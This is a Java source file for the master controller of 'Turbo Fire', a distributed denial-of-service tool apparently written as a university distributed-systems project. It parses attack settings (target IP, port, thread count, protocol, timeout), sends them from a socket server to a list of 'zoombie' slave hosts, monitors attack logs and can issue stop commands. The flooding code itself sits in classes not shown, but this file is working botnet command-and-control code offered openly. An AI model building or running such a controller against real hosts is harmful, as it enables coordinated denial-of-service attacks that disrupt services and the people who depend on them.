/**
 * FIRESEC TURBO FIRE
 * A stress network analysis tool.
 * ------------------------------------
 * Written by Lucas Fonseca dos Santos.
 * Copyleft 2018 - Rights not reserved.
 * ------------------------------------
 * 
 * Pratical project for discipline Distributed
 * Systems of Federal Univeristy of Lavras - MG,
 * Brazil.
 * 
 * CONTACT:
 * lucas@lcfcompany.com.br
 * github.com/LucasFonsecaDosSantos
 */
package app;

import java.util.concurrent.TimeUnit;
import view.GUI;
import utilies.AttackPattern;
import tasks.ServerThread;
import tasks.StopCommandMasterThread;
import tasks.ClientThread;
import tasks.ResponseServer;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.InetAddress;
import java.util.List;
import java.util.ArrayList;

/**
 * @author Lucas Fonseca dos Santos
 * @author Otavio Andrade
 * @version 1.0
 * 
 * This class describes the Master turbo fire version executable.
 * This version is responsible to command all slaves machines of
 * zoombie network and send for them attack commands with settings
 * defined by the user.
 * 
 * The attack settings can be defined by the user are:
 * - Target host IP (--address or -ip);
 * - Target access port (--port or -pt);
 * - Attack Range (--range or -r);
 * - Protocol time out (--timeOut or -to);
 * - Attack threads amount (--threads or -t);
 * - Text message protocol content (--message or -m);
 * - Type of protocol will be used (--protocol or -p);
 */
public class TurboFireMaster {
    
    /**
     * The gui text user interface.
     */
    private GUI gui;

    /**
     * An integer server port value.
     * (Between 1025 to 65533).
     */
    private int serverPort;

    /**
     * The main master server socket connection.
     */
    private ServerSocket server;

    /**
     * The server communication process.
     */
    private Runnable serverThread;

    /**
     * A zoombie network hosts list.
     */
    private ArrayList zoombieList;

    /**
     * A DDOS attack pattern with all attack settings defined
     * by the user.
     */
    private AttackPattern attackPattern;

    private static List attackLogs;
    private static ArrayList<String> zoombieHosts;
    private Thread responseServer;
    private Thread masterServer;
    /** 
     * The master turbo fire executable version
     * object constructor. It sets a gui instance,
     * a server port value and zoombie list. After that,
     * it execs the main method that will be starts the
     * master server.
    */
    public TurboFireMaster() {
        this.serverPort  = 3425;
        this.responseServer = null;
        this.masterServer = null;
        this.gui         = new GUI();
        this.zoombieList = new ArrayList<Socket>();
        zoombieHosts     = new ArrayList<String>();
        attackLogs       = new ArrayList<AttackPattern>();
        startMaster();
    }

    /**
     * This is the main master method.
     * It interprets the settings inputed by the user to
     * formatt attack and process it.
     */
    public void startMaster() {
        while(true) {
            this.gui.welcome("master", this.serverPort);
            String[] command = this.gui.getCommand();
            this.gui.clean();
            if(command[0].equalsIgnoreCase("exit") || command[0].equalsIgnoreCase("quit")) {
                System.exit(0);
            }else if(command[0].equalsIgnoreCase("stop")) {
                Thread t = new Thread(new StopCommandMasterThread(this.zoombieHosts, 4848));
                t.start();
            }else if(command[0].equalsIgnoreCase("monitoring")) {
                while(true) {
                    try {
                        TimeUnit.SECONDS.sleep(1);
                        GUI.showAttackActivity(attackLogs.size(), attackLogs, getZoombieHosts(), this.attackPattern);
                    } catch (InterruptedException ie) {
                        GUI.showExceptionLog(ie.toString());
                    }
                }
            }else if(command[0].equals("help")) {
                this.gui.help();
                this.gui.pressEnterToContinue();
            }else if(command[0].equals("list")) {
                this.gui.showActiveZoombie(this.zoombieHosts);
            }else if (command[0].equalsIgnoreCase("fire")) {
                int port = 80;
                int threadAmount = 1;
                int connectionTimeOut = 300;
                int attackRange = 3;
                String ipAddress = null;
                String protocol = null;
                String message = "Turbo Fire - Stress network test software tool.";
                
                for(int i=1 ; i < command.length ; i++) {
                    if(command[i].equalsIgnoreCase("--target") || command[i].equalsIgnoreCase("-ip")) {
                        if(command[i+1] != null && command[i+1].getClass().getName().toString().equals("java.lang.String")) {
                            ipAddress = command[i+1];
                            i++;
                        }
                    }else if(command[i].equalsIgnoreCase("--port") || command[i].equalsIgnoreCase("-p")) {
                        if(command[i+1] != null) {
                            port = Integer.parseInt(command[i+1]);
                            if(port < 1024 || port > 65535) {
                                port = 80;
                            }
                            i++;
                        }
                    }else if(command[i].equalsIgnoreCase("--thread") || command[i].equalsIgnoreCase("-t")) {
                        if(command[i+1] != null) {
                            threadAmount = Integer.parseInt(command[i+1]);
                            i++;
                        }
                    }else if(command[i].equalsIgnoreCase("--protocol") || command[i].equalsIgnoreCase("-pl")) {
                        if(command[i+1] != null) {
                            protocol = command[i+1];
                            i++;
                        }
                    }else if(command[i].equalsIgnoreCase("--timeOut") || command[i].equalsIgnoreCase("-to")) {
                        if(command[i+1] != null) {
                            connectionTimeOut = Integer.parseInt(command[i+1]);
                            i++;
                        }
                    }else if(command[i].equalsIgnoreCase("--message") || command[i].equalsIgnoreCase("-m")) {
                        if(command[i+1] != null) {
                            message = command[i+1];
                            i++;
                        }
                    }else if(command[i].equalsIgnoreCase("--range") || command[i].equalsIgnoreCase("-r")) {
                        if(command[i+1] != null) {
                            attackRange = Integer.parseInt(command[i+1]);
                            i++;
                        }
                    }
                }
                if(ipAddress == null) {
                    ipAddress = "127.0.0.1";
                }
                if(protocol == null) {
                    protocol = "TCP";
                }
                if(command.length == 1) {
                    this.gui.showMessage("You didnt enter any arguments. Then, this parameters will be set for attack operation: ");
                }else {
                    this.gui.showMessage("Finished! Your attack operation was been configured!");        
                }
                this.gui.showMessage("Protocol: " + protocol);
                this.gui.showMessage("Address: " + ipAddress);
                this.gui.showMessage("Port: " + port);
                this.gui.showMessage("Operation Thread Amount: " + threadAmount);
                this.gui.showMessage("Connection Time Out: " + connectionTimeOut);
                this.gui.showMessage("Attack Range: " + attackRange);
                this.gui.showMessage("Message: " + message);
                this.gui.pressEnterToContinue();
                this.attackPattern = new AttackPattern(protocol, ipAddress, port, threadAmount, connectionTimeOut, attackRange, message, null);
                this.masterServer = new Thread(new ServerThread(this.serverPort ,this.attackPattern));
                this.masterServer.start();
                this.responseServer = new Thread(new ResponseServer());
                this.responseServer.start();
            }
        }
    }

    /**
     * The server port state attribute accessor method.
     * 
     * @return int An integer server port value.
     */
    public int getServerPort() {
        return this.serverPort;
    }

    /**
     * The server address state attribute accessor method.
     * 
     * @return InetAddress A object InetAddress with the server socket address.
     */
    public InetAddress getServerAddress() {
        return this.server.getInetAddress();
    }

    /**
     * The attackLogs attribute state modifier method.
     * 
     * @param data A attackPattern object sended by response requisition.
     */
    public static void addAttackLog(AttackPattern data) {
        attackLogs.add(data);
    }

    /**
     * The zombieHosts attribute state accessor method.
     * 
     * @return ArrayList A list with zombie IP address.
     */
    public static ArrayList<String> getZoombieHosts() {
        return zoombieHosts;
    }

    /**
     * The zombieHosts attribute state modifier method.
     * 
     * @param address A string zombie IP address.
     */
    public static void addNewZoombieHost(String address) {
        zoombieHosts.add(address);
    } 
}